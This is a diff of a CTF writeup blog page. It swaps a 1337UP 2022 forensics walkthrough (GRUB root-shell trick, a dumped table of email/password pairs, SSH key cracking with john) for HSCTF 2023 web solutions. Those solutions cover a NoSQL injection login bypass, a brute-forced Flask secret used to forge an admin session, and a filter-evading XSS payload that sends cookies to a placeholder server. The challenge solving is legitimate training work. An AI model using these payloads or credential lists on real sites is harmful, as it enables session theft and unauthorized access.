@@ -9,26 +9,24 @@
     <meta name="generator" content="Retype 3.0.3">
 
     <!-- Primary Meta Tags -->
-    <title>Liikt#1337</title>
-    <meta name="title" content="Liikt#1337">
-    <meta name="description" content="A walkthrough on misc challenge from 1337UP Live 2022" />
+    <title>HSCTF 2023 Web writeup</title>
+    <meta name="title" content="HSCTF 2023 Web writeup">
+    <meta name="description" content="Category - WEB" />
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/aiden/" />
+    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/hsctf23/web/" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/aiden/">
-    <meta property="og:title" content="Liikt#1337">
-    <meta property="og:description" content="A walkthrough on misc challenge from 1337UP Live 2022">
-    <meta property="og:image" content="https://raw.githubusercontent.com/AidenPearce369/AidenPearce369.github.io/main/_posts/CTF/1337UP-Live-Pics/liikt-1.png">
+    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/hsctf23/web/">
+    <meta property="og:title" content="HSCTF 2023 Web writeup">
+    <meta property="og:description" content="Category - WEB">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/aiden/">
-    <meta property="twitter:title" content="Liikt#1337">
-    <meta property="twitter:description" content="A walkthrough on misc challenge from 1337UP Live 2022">
-    <meta property="twitter:image" content="https://raw.githubusercontent.com/AidenPearce369/AidenPearce369.github.io/main/_posts/CTF/1337UP-Live-Pics/liikt-1.png">
+    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/hsctf23/web/">
+    <meta property="twitter:title" content="HSCTF 2023 Web writeup">
+    <meta property="twitter:description" content="Category - WEB">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -208,10 +206,10 @@
                                 <div id="docs-sidebar-right-toggle"></div>
                 
                                 <!-- Page content  -->
-<doc-anchor-target id="liikt1337" class="break-words">
+<doc-anchor-target id="hsctf-2023-writeups" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#liikt1337">#</doc-anchor-trigger>
-        <span>Liikt#1337</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#hsctf-2023-writeups">#</doc-anchor-trigger>
+        <span>HSCTF-2023 writeups</span>
     </h1>
 </doc-anchor-target>
 <div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
@@ -221,293 +219,309 @@
           <div class="shrink-0 w-8 h-8 overflow-hidden rounded-full">
             <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" fill="white"><g><rect width="2rem" height="1.7rem" fill="#c5c5c5"/><circle r="0.44rem" cy="0.83rem" cx="1rem"/><ellipse ry="0.96rem" rx="0.77rem" cy="2.15rem" cx="1rem"/></g></svg>
           </div>
-          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">AidenPearce369</div>
+          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">0xRaminf0sec</div>
         </div>
     </div>
     <div class="mx-2">&#9679;</div>
     <div>In&nbsp;</div>
-    <div><a href="../../../categories/1337up/">1337UP</a></div>
+    <div><a href="../../../categories/hsctf/">HSCTF</a></div>
     <div class="mx-2">&#9679;</div>
-    <div class="flex items-center shrink-0">Published&nbsp;<span>2022-03-12</span></div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2023-03-09</span></div>
 </div>
 
-<p>Here goes the challenge description</p>
-<p><figure class="content-center">
-    <img src="https://raw.githubusercontent.com/AidenPearce369/AidenPearce369.github.io/main/_posts/CTF/1337UP-Live-Pics/liikt-1.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>After downloading the zip file, extracting the contents using password</p>
-<p>Doing <code v-pre>strings</code> on it,</p>
+<p>Category - WEB</p>
+<doc-anchor-target id="chall-1--th3-w3bsite">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#chall-1--th3-w3bsite">#</doc-anchor-trigger>
+        <span>Chall 1 → th3-w3bsite</span>
+    </h2>
+</doc-anchor-target>
+<p>chall link - <a href="https://th3-w3bsite.hsctf.com/">https://th3-w3bsite.hsctf.com/</a></p>
+<p>Description :</p>
+<p>It&#x27;s a really simple w3bsite. Nothing much else to say. Be careful though.</p>
+<p><strong>Solution :</strong></p>
+<p>By seeing the source code , we can able to get the flag .</p>
+<p><strong><code v-pre>Flag : flag{1434}</code></strong></p>
+<doc-anchor-target id="chall-2--an-inaccessible-admin-panel">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#chall-2--an-inaccessible-admin-panel">#</doc-anchor-trigger>
+        <span>Chall 2 → <strong>an-inaccessible-admin-panel</strong></span>
+    </h2>
+</doc-anchor-target>
+<p>chall link - <a href="https://login-web-challenge.hsctf.com/">https://login-web-challenge.hsctf.com/</a></p>
+<p>Description :</p>
+<p>The Joker is on the loose again in Gotham City! Police have found a web application where the Joker had allegedly tampered with. This mysterious web application has login page, but it has been behaving abnormally lately. Some time ago, an admin panel was created, but unfortunately, the password was lost to time. Unless you can find it...</p>
+<p>Can you prove that the Joker had tampered with the website?</p>
+<p>Default login info: Username: default Password: password123</p>
+<p><strong>Solution :</strong></p>
+<p>By looking the source code , the webpage have login.js file for validating the login.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(kali㉿aidenpearce369)-[~/IntigritiCTF/Liikt/Kali-Linux]
-└─$ cat * 2&gt;/dev/null | grep -a &quot;1337UP{&quot;
-flag1:&lt;-- START 1337UP{5530491e6c0b5159
-liikt:x:1001:1001:,,,:/home/liikt:/bin/bash� 1337UP{5530��
-flag1:&lt;-- START 1337UP{5530491e6c0b5159
-flag1:&lt;-- START 1337UP{5530491e6c0b5159
-flag1:&lt;-- START 1337UP{5530491e6c0b5159
-flag1:&lt;-- START 1337UP{5530491e6c0b5159</code></pre>
+<pre class="language-jsx"><code v-pre class="language-jsx">window.onload = function() {
+    var loginForm = document.getElementById(&quot;loginForm&quot;);
+    loginForm.addEventListener(&quot;submit&quot;, function(event) {
+        event.preventDefault(); 
+    
+        var username = document.getElementById(&quot;username&quot;).value;
+        var password = document.getElementById(&quot;password&quot;).value;
+    
+        function fii(num){
+            return num / 2 + fee(num);
+        }
+        function fee(num){
+            return foo(num * 5, square(num));
+        }
+        function foo(x, y){
+            return x*x + y*y + 2*x*y;
+        }
+        function square(num){
+            return num * num;
+        }
+
+        var key = [32421672.5, 160022555, 197009354, 184036413, 165791431.5, 110250050, 203747134.5, 106007665.5, 114618486.5, 1401872, 20702532.5, 1401872, 37896374, 133402552.5, 197009354, 197009354, 148937670, 114618486.5, 1401872, 20702532.5, 160022555, 97891284.5, 184036413, 106007665.5, 128504948, 232440576.5, 4648358, 1401872, 58522542.5, 171714872, 190440057.5, 114618486.5, 197009354, 1401872, 55890618, 128504948, 114618486.5, 1401872, 26071270.5, 190440057.5, 197009354, 97891284.5, 101888885, 148937670, 133402552.5, 190440057.5, 128504948, 114618486.5, 110250050, 1401872, 44036535.5, 184036413, 110250050, 114618486.5, 184036413, 4648358, 1401872, 20702532.5, 160022555, 110250050, 1401872, 26071270.5, 210656255, 114618486.5, 184036413, 232440576.5, 197009354, 128504948, 133402552.5, 160022555, 123743427.5, 1401872, 21958629, 114618486.5, 106007665.5, 165791431.5, 154405530.5, 114618486.5, 190440057.5, 1401872, 23271009.5, 128504948, 97891284.5, 165791431.5, 190440057.5, 1572532.5, 1572532.5];
+
+        function validatePassword(password){
+            var encryption = password.split('').map(function(char) {
+                return char.charCodeAt(0);
+            });
+            var checker = [];
+            for (var i = 0; i &lt; encryption.length; i++) {
+                var a = encryption[i];
+                var b = fii(a);
+                checker.push(b);
+            }
+            console.log(checker);
+            
+            if (key.length !== checker.length) {
+                return false;
+            }
+            
+            for (var i = 0; i &lt; key.length; i++) {
+                if (key[i] !== checker[i]) {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        if (username === &quot;Admin&quot; &amp;&amp; validatePassword(password)) {
+            alert(&quot;Login successful. Redirecting to admin panel...&quot;);
+            window.location.href = &quot;admin_panel.html&quot;;
+        }
+        else if (username === &quot;default&quot; &amp;&amp; password === &quot;password123&quot;) {
+            var websiteNames = [&quot;Google&quot;, &quot;YouTube&quot;, &quot;Minecraft&quot;, &quot;Discord&quot;, &quot;Twitter&quot;];
+            var websiteURLs = [&quot;https://www.google.com&quot;, &quot;https://www.youtube.com&quot;, &quot;https://www.minecraft.net&quot;, &quot;https://www.discord.com&quot;, &quot;https://www.twitter.com&quot;];
+            var randomNum = Math.floor(Math.random() * websiteNames.length);
+            alert(&quot;Login successful. Redirecting to &quot; + websiteNames[randomNum] + &quot;...&quot;);
+            window.location.href = websiteURLs[randomNum];
+        } else {
+            alert(&quot;Invalid credentials. Please try again.&quot;);
+        }
+    });
+  };</code></pre>
 </doc-codeblock></div>
-<p>Seems like we have found first part of the flag
-It is a memory image &amp; virtual hardisk of VMWare images
-Importing it into VMWare and started booting it, we will face the login prompt with absolutely no idea of login credentials
-The only way to bypass this is to use a small trick on <code v-pre>GRUB</code> to spawn <code v-pre>root shell</code>
-Changing <code v-pre>ro ...</code> in GRUB to <code v-pre>rw init=/bin/bash</code> and loading it will give us a root level shell, where we can use <code v-pre>passwd</code> command to change password for <code v-pre>root</code> user
-For detailed <a href="https://www.layerstack.com/resources/tutorials/Resetting-root-password-for-Linux-Cloud-Servers-by-booting-into-Single-User-Mode">blog</a>
-After gaining shell, we can see a user named <code v-pre>liikt</code></p>
+<p>So, what actually happening here was, if the username is equals to Admin and the given password is encrypted using above validatepassword() function.
+We have to reverse this process for the key[] array to find a password !!.
+I decided to encrypt all the printable characters using this above logic and match with the key array to find a original key!!.</p>
+<p>Here is the script to find a key .</p>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">import string
+
+def fii(num):
+    return num / 2 + fee(num);
+
+        
+def fee(num):
+    return foo(num * 5, square(num));
+
+        
+def foo(x, y):
+    return x * x + y * y + 2 * x * y;
+
+        
+def square(num):
+    return num * num;
+
+key = [32421672.5, 160022555, 197009354, 184036413, 165791431.5, 110250050, 203747134.5, 106007665.5, 114618486.5, 1401872, 20702532.5, 1401872, 37896374, 133402552.5, 197009354, 197009354, 148937670, 114618486.5, 1401872, 20702532.5, 160022555, 97891284.5, 184036413, 106007665.5, 128504948, 232440576.5, 4648358, 1401872, 58522542.5, 171714872, 190440057.5, 114618486.5, 197009354, 1401872, 55890618, 128504948, 114618486.5, 1401872, 26071270.5, 190440057.5, 197009354, 97891284.5, 101888885, 148937670, 133402552.5, 190440057.5, 128504948, 114618486.5, 110250050, 1401872, 44036535.5, 184036413, 110250050, 114618486.5, 184036413, 4648358, 1401872, 20702532.5, 160022555, 110250050, 1401872, 26071270.5, 210656255, 114618486.5, 184036413, 232440576.5, 197009354, 128504948, 133402552.5, 160022555, 123743427.5, 1401872, 21958629, 114618486.5, 106007665.5, 165791431.5, 154405530.5, 114618486.5, 190440057.5, 1401872, 23271009.5, 128504948, 97891284.5, 165791431.5, 190440057.5, 1572532.5, 1572532.5]
+
+def vaildatepassword(password):
+
+	dec = []
+
+	for i in key:
+		for j in string.printable:
+
+			k = i
+			a = ord(j)
+
+			b = fii(a)
+			if b == k:
+				print(chr(a), end=&quot;&quot;)
+
+			dec.append(b)
+
+	# return enc
+
+vaildatepassword(&quot;flag&quot;)</code></pre>
+</doc-codeblock></div>
+<p>Here is the decrypted key :</p>
+<p><code v-pre>Introduce A Little Anarchy, Upset The Established Order, And Everything Becomes Chaos!!</code></p>
+<p>Using this key , we can able to login and redirected to admin_panel.html</p>
+<p><code v-pre>Flag : flag{Admin , Introduce A Little Anarchy, Upset The Established Order, And Everything Becomes Chaos!!}</code></p>
+<doc-anchor-target id="chall-3--mogodb">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#chall-3--mogodb">#</doc-anchor-trigger>
+        <span>Chall 3 → <strong>mogodb</strong></span>
+    </h2>
+</doc-anchor-target>
+<p>link - <a href="http://mogodb.hsctf.com/">http://mogodb.hsctf.com/</a></p>
+<p>Description :</p>
+<p>The web-scale DB of the future!</p>
+<p><strong>Solution:</strong></p>
+<p>They gave the source code for the challenge , on inspecting <a href="http://main.py">main.py</a> it has some routes to login and register .</p>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">@app.route(&quot;/&quot;, methods=[&quot;POST&quot;])
+def login():
+	if &quot;user&quot; not in request.form:
+		return redirect(url_for(&quot;main&quot;, error=&quot;user not provided&quot;))
+	if &quot;password&quot; not in request.form:
+		return redirect(url_for(&quot;main&quot;, error=&quot;password not provided&quot;))
+	
+	try:
+		user = db.users.find_one(
+			{
+			&quot;$where&quot;:
+				f&quot;this.user === '{request.form['user']}' &amp;&amp; this.password === '{request.form['password']}'&quot;
+			}
+		)
+	except pymongo.errors.PyMongoError:
+		traceback.print_exc()
+		return redirect(url_for(&quot;main&quot;, error=&quot;database error&quot;))
+	
+	if user is None:
+		return redirect(url_for(&quot;main&quot;, error=&quot;invalid credentials&quot;))
+	
+	session[&quot;user&quot;] = user[&quot;user&quot;]
+	session[&quot;admin&quot;] = user[&quot;admin&quot;]
+	return redirect(url_for(&quot;home&quot;))</code></pre>
+</doc-codeblock></div>
+<p>We can see here , the user input directly appends into the query inside single quotes.
+SQLi !!!</p>
+<p>Here is the payload to bypass the authentication .</p>
+<p><code v-pre>user=admin&amp;password='+||+'1'=='1</code></p>
+<p>Bypassed !!</p>
+<p><code v-pre>Flag : flag{easier_than_picture_lab_at_least}</code></p>
+<doc-anchor-target id="chall-4---very-secure">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#chall-4---very-secure">#</doc-anchor-trigger>
+        <span>Chall 4 - <strong>very-secure</strong></span>
+    </h2>
+</doc-anchor-target>
+<p>link - <a href="http://very-secure.hsctf.com/">http://very-secure.hsctf.com/</a></p>
+<p>Description :</p>
+<p>this website is obviously 100% secure</p>
+<p><strong>Solution:</strong></p>
+<p>They gave the source code for this challenge .</p>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">from flask import Flask, render_template, session
+import os
+app = Flask(__name__)
+SECRET_KEY = os.urandom(2)
+app.config['SECRET_KEY'] = SECRET_KEY
+FLAG = open(&quot;flag.txt&quot;, &quot;r&quot;).read()
+
+@app.route('/')
+def home():
+    return render_template('index.html')
+
+@app.route('/flag')
+def get_flag():
+    if &quot;name&quot; not in session:
+        session['name'] = &quot;user&quot;
+    is_admin = session['name'] == &quot;admin&quot;
+    return render_template(&quot;flag.html&quot;, flag=FLAG, admin = is_admin)
+
+if __name__ == '__main__':
+    app.run()</code></pre>
+</doc-codeblock></div>
+<p>on inspecting the <a href="http://app.py">app.py</a> , we can see the SECRET_KEY is the random of length 2 bytes!!</p>
+<p>So , we can able to bruteforce the SECRET_KEY easily!!</p>
+<p>For that we have to generate the random bytes length of 300.</p>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">f= open(&quot;bytes.txt&quot;,'a+')
+for i in range(300):
+	for j in range(300):
+		f.write(f'{chr(i)}{chr(j)}\n')</code></pre>
+</doc-codeblock></div>
+<p>Using flask-unsign we can able to bruteforce the secret_key</p>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">flask-unsign --wordlist ~/Desktop/bytes.txt --unsign --cookie 'eyJuYW1lIjoidXNlciJ9.ZH7Xnw.QP8s7mNoNvwInGLDBN3fgw46Zuk' --no-literal-eval
+[*] Session decodes to: {'name': 'user'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 34816 attempts
+b'p6'</code></pre>
+</doc-codeblock></div>
+<p>‘p6’ is the secret key used!!.</p>
+<p>Now , we have to sign the token using this secretkey</p>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">flask-unsign --sign --cookie &quot;{'name': 'admin'}&quot; --secret 'p6'
+
+eyJuYW1lIjoiYWRtaW4ifQ.ZH7d-w.YF2iU4MpkmE9CXkCE8lIGenZ_Pc</code></pre>
+</doc-codeblock></div>
+<p>So using this token , we can able to get the flag !!.</p>
+<doc-anchor-target id="chall-5-fancy-page">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#chall-5-fancy-page">#</doc-anchor-trigger>
+        <span>Chall 5 →<strong>fancy-page</strong></span>
+    </h2>
+</doc-anchor-target>
+<p>link : <a href="http://fancy-page.hsctf.com/">http://fancy-page.hsctf.com/</a></p>
+<p>Description : hmmm</p>
+<p><strong>Solution:</strong></p>
+<p>In this webpage , we can able to create a content and send that content to the admin bot.</p>
+<p>So, if we popup XSS , we can able to steal any info from the admin bot!!.</p>
+<p>They gave the source code of the challenge.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[~]
-└─# id
-uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),119(wireshark),142(kaboxer)
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[~]
-└─# hostname
-kali
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[~]
-└─# ls /home 
-kali  liikt</code></pre>
+<pre class="language-jsx"><code v-pre class="language-jsx">import { default as Arg } from &quot;https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm&quot;;
+
+function sanitize(content) {
+	return content.replace(/script|on|iframe|object|embed|cookie/gi, &quot;&quot;);
+}
+
+let title = document.getElementById(&quot;title&quot;);
+let content = document.getElementById(&quot;content&quot;);
+
+function display() {
+	title.textContent = Arg(&quot;title&quot;);
+	document.title = Arg(&quot;title&quot;);
+
+	let sanitized = sanitize(Arg(&quot;content&quot;));
+	content.innerHTML = sanitized;
+
+	document.body.style.backgroundColor = Arg(&quot;background_color&quot;);
+	document.body.style.color = Arg(&quot;color&quot;);
+	document.body.style.fontFamily = Arg(&quot;font&quot;);
+	content.style.fontSize = Arg(&quot;font_size&quot;) + &quot;px&quot;;
+}
+
+display();</code></pre>
 </doc-codeblock></div>
-<p>Lets find the string <code v-pre>flag1:&lt;-- START 1337UP{5530491e6c0b5159</code> with filename, which we found earlier in memory</p>
+<p>On inspecting the display.js , it replaces the script,on,iframe,object,embed,cookie elements to “”.</p>
+<p>so, what if we give the input like scrscriptipt. It removes the script string inside that string and it became again script !!.</p>
+<p>So, the actual payload is</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[~]
-└─# grep -H -r &quot;1337UP{&quot; /  2&gt;/dev/null
-/etc/passwd:flag1:&lt;-- START 1337UP{5530491e6c0b5159
-^C
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[~]
-└─# tail /etc/passwd                                                                                                                                                                                                                 
-saned:x:128:135::/var/lib/saned:/usr/sbin/nologin
-inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin
-lightdm:x:130:138:Light Display Manager:/var/lib/lightdm:/bin/false
-colord:x:131:139:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
-geoclue:x:132:140::/var/lib/geoclue:/usr/sbin/nologin
-king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
-kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-liikt:x:1001:1001:,,,:/home/liikt:/bin/bash
-flag1:&lt;-- START 1337UP{5530491e6c0b5159</code></pre>
+<pre class="language-jsx"><code v-pre class="language-jsx">&lt;img src=x oonnerror=this.src='http://yourserver/?'+document.coocookiekie;&gt;</code></pre>
 </doc-codeblock></div>
-<p>Now we have to find the second part of the flag
-After some enumeration</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[~]
-└─# cd /home/liikt/
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[/home/liikt]
-└─# ls
-Desktop  Documents  Downloads  Music  Pictures  Public  pwned.txt  Templates  Videos
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[/home/liikt]
-└─# cat pwned.txt  
-Here lies the list of systems with poor security and what I have on them (Just so I don't forget):
-0.0.0.0 (backdoor with liikytongue)
-8.8.8.8 (backdoor with liikt)
-127.0.0.1 (backdoor with real_root)
-blacknote.ctf.intigriti.io (backdoor with blackn0te)
-yeeter.thisisnotrealsite.com (data dump)
-footbook.thisisnotrealsite.com(data dump)</code></pre>
-</doc-codeblock></div>
-<p>Seems like we have to find some creds for backdoor/ data dump
-While enumerating I saw <code v-pre>MySQL</code> and <code v-pre>Postgres</code> installed in this machine
-My thought is to give a try on those
-After starting <code v-pre>MySQL service</code>,</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[/home/liikt]
-└─# mysql -u root
-ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/run/mysqld/mysqld.sock' (2)
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[/home/liikt]
-└─#  sudo service mysqld start                                                                                                                                                                                                  
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[/home/liikt]
-└─# mysql -u root             
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 30
-Server version: 10.5.12-MariaDB-1 Debian 11
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-MariaDB [(none)]&gt; </code></pre>
-</doc-codeblock></div>
-<p>Lets enumerate it further,</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">MariaDB [(none)]&gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mysql              |
-| performance_schema |
-| yeeter_dump        |
-+--------------------+
-4 rows in set (0.000 sec)
-MariaDB [(none)]&gt; use yeeter_dump;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-Database changed
-MariaDB [yeeter_dump]&gt; show tables;
-+-----------------------+
-| Tables_in_yeeter_dump |
-+-----------------------+
-| creds                 |
-+-----------------------+
-1 row in set (0.000 sec)
-MariaDB [yeeter_dump]&gt; select * from creds;
-+----------------------------------+---------------------------------+
-| email                            | password                        |
-+----------------------------------+---------------------------------+
-| peter@email.com                  | Lowstreet4                      |
-| amy@fake.com                     | Applest652                      |
-| hannah@loser.net                 | Mountain21!#13$f                |
-| michael54@lousymail.com          | Valley345$fs                    |
-| sandy@spongebob.com              | Oceanblvd2                      |
-| betty@meme.com                   | GreenGrass1                     |
-| johnhammond@youtuber.com         | PlzSubscribe!#XD                |
-| followmytwitter@BlacknoteSec.com | BlacknoteSec                    |
-| liikt@hacker.com                 | best_h3ckerman!69-              |
-| peter_parker@avengers.com        | Sp00derm4n                      |
-| thor@asgard.com                  | StrongestAvenger1               |
-| pink@draconian.com               | MainRoad989                     |
-| viola@email.com                  | ViolaPlaysViolin00              |
-| uanikolayf@gmailya.com           | qwertyuiop                      |
-| willing@mail.com                 | SF4ss4fds56                     |
-| sdfdslike@mail.com               | Password01                      |
-| pinkdraconian@youtuber.com       | IntigritiRockz6969_             |
-| perfect@blue.com                 | dizCTF2ez!                      |
-| matt_e@dev.com                   | Pwn2Ez4m3                       |
-| fumenoid@dev.com                 | I4mJust4N00b                    |
-| congon4tor@dev.com               | webm3up!                        |
-| lorem@ipsumdolor.sit             | amet!consectetur                |
-| qwerty@qwerty.com                | asdfghjkl1234                   |
-| thegamer@games.com               | wtfgames!$                      |
-| justemail@random.com             | fhcnawisg456                    |
-| whateberafsd@asdf.com            | bjhgawf243                      |
-| igiveup@mails.com                | randomasd                       |
-| afdasdf.mail.com                 | kjhgfwff123                     |
-| hjsadf@asd.com                   | nbxvcsduycg                     |
-| sinister_matrix@coolguy.com      | jbhaf#jyavnw54                  |
-| pwnfunction@youtuber.com         | hackercamp.co                   |
-| optional@ctf.com                 | I4amJust4Ch4d                   |
-| badboy17@byteforce.com           | h4xl33terrrrrr45                |
-| streaker_rules@byteforce.com     | cryptog0d6969                   |
-| lucas@byteforce.com              | lukeflima69                     |
-| szymex73@ctf.com                 | justanothern00b                 |
-| calebjstewart@dev.com            | UsePwnCat                       |
-| ashok_b_simping@mlp.com          | IAmAcl0wn69                     |
-| d0minik@mlp.com                  | polarbears4recute137            |
-| smellycharlie@oldman.com         | ageisjustanumber!#$             |
-| liveoverflow@youtuber.com        | isthereanyoneelsebetter?!       |
-| kevinmitnick@oldschool.com       | legend                          |
-| ippsec@youtube.com               | whatsgoingonyoutubethisisippsec |
-| sfsd@sgsg.com                    | asdfasdfkjhg2354                |
-| jhgaf@nbasaf.com                 | hbadjegf546                     |
-| bjhacwg@afsjhgkwsjf.com          | ajhfskgseuf                     |
-| nbmygf@sajh.com                  | bvjhhgf                         |
-| postmalone@music.com             | makingApostRequest              |
-| lame@lame.com                    | sadfgsf                         |
-| whateven@what.com                | wgfasgb                         |
-+----------------------------------+---------------------------------+
-50 rows in set (0.001 sec)
-MariaDB [yeeter_dump]&gt; </code></pre>
-</doc-codeblock></div>
-<p>Seems like login creds, but for why
-From the hint of <code v-pre>pwned.txt</code> we can see theres a legit hostname <code v-pre>blacknote.ctf.intigriti.io</code>
-Because, the CTF was hosted on <code v-pre>ctf.intigriti.io</code>, it was merely a subdomain
-Scanning this hostname with <code v-pre>nmap</code>,</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[/home/liikt]
-└─# nmap blacknote.ctf.intigriti.io -sC -A -sV
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 13:13 EST
-Nmap scan report for blacknote.ctf.intigriti.io (34.76.107.214)
-Host is up (0.035s latency).
-rDNS record for 34.76.107.214: 214.107.76.34.bc.googleusercontent.com
-Not shown: 999 filtered tcp ports (no-response)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 23:7b:2b:00:c4:18:cf:a4:2e:a5:1b:19:e5:97:71:c9 (RSA)
-|   256 1c:f7:37:b1:75:95:7d:3f:88:eb:47:94:c4:35:cf:56 (ECDSA)
-|_  256 6f:4e:1d:84:73:d7:42:4b:e1:04:54:04:56:ae:c8:9e (ED25519)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: WAP|general purpose
-Running: Actiontec embedded, Linux 2.4.X|3.X, Microsoft Windows XP|7|2012
-OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:linux:linux_kernel:3.2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
-OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37), Linux 3.2, Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-TRACEROUTE (using port 80/tcp)
-HOP RTT     ADDRESS
-1   0.14 ms 192.168.116.2
-2   0.16 ms 214.107.76.34.bc.googleusercontent.com (34.76.107.214)
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 131.02 seconds</code></pre>
-</doc-codeblock></div>
-<p>Seems like <code v-pre>SSH</code> is open
-And from <code v-pre>pwned.txt</code> the hint says, <code v-pre>backdoor with blackn0te</code>
-Lets assume the username is <code v-pre>blackn0te</code>
-And from the dumped creds, <code v-pre>liikt@hacker.com:best_h3ckerman!69-</code> matches the description
-While connecting with <code v-pre>ssh</code>, it prompts for <code v-pre>id_rsa</code> password,</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[~/.ssh]
-└─# ssh blackn0te@blacknote.ctf.intigriti.io
-Enter passphrase for key '/root/.ssh/id_rsa': </code></pre>
-</doc-codeblock></div>
-<p>Lets use john to crack it,</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">┌──(root💀kali)-[~/.ssh]
-└─# ls
-hash_ssh  id_rsa  id_rsa.pub  known_hosts  known_hosts.old  pass.txt
-                                                                                                                                                                                                                                           
-┌──(root💀kali)-[~/.ssh]
-└─# /usr/share/john/ssh2john.py id_rsa &gt; hash_ssh
-──(root💀kali)-[~/.ssh]
-└─# john hash_ssh --wordlist=pass.txt   
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/32])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
-Cost 2 (iteration count) is 16 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-Warning: Only 1 candidate left, minimum 4 needed for performance.
